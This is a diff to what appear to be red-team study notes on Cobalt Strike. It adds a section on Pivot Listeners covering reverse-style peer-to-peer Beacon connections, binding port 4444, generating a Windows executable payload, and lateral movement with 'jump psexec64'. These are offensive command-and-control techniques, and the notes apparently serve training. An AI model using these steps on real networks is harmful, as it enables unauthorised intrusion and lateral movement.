@@ -33,8 +33,7 @@ or find domain admins
 
 
 ### Peer-to-Peer Listeners
-Allows one beacon to talk to another beacon without having to directly talk to the team server.
-
+Allows one beacon to talk to another beacon without having to directly talk to the team server (like setting up a port bind on target).
 
 Go to Listeners, add, choose payload to be either beacon SMB or beacon TCP.
 
@@ -44,6 +43,40 @@ Use `link` and `connect` commands on first target to connect.
 
 `connect <first_target_ip> 4444`
 
+### Pivot Listeners
+
+^4b657f
+
+^118d4f
+This is another type of P2P listener that (currently only) uses TCP, but it works in the opposite direction to the regular TCP listener (like setting up a reverse shell).
+
+When you spawn a Beacon payload that uses the TCP listener, that Beacon acts as a TCP server and waits for an incoming connection from an existing Beacon (TCP client).
+
+In scenarios such as GPO abuse, you don't know when the target will actually execute your payload and therefore when you need issue the `connect` command. When a Beacon checks in over a Pivot listener, it will appear in the UI immediately without having to manually connect to it.
+
+To start a Pivot Listener on an existing Beacon, right-click it and select **Pivoting > Listener**.
+
+Once started, your selected port will be bound on that machine.
+
+```
+beacon> run netstat -anp tcp
+
+Active Connections
+
+  Proto  Local Address          Foreign Address        State
+  TCP    0.0.0.0:4444           0.0.0.0:0              LISTENING
+```
+
+You can generate payloads for the pivot listener in exactly the same way as other listeners. When executed on a target, you should see the Beacon appear automatically. 
+
+For example:
+Go to Attacks, Packages, Windows Executable (S), choose the listener you just set up. Run payload on target.
+
+You can also use 'psexec64'
+
+```
+jump psexec64 srv-1 name-of-pivot-listner
+```
 
 
 ### Test Local Admin access
@@ -103,7 +136,6 @@ PID   PPID  Name                         Arch  Session     User
 2656  716   sqlservr.exe                 x64   0           DEV\svc_mssql
 
 ```
-
 
 
 
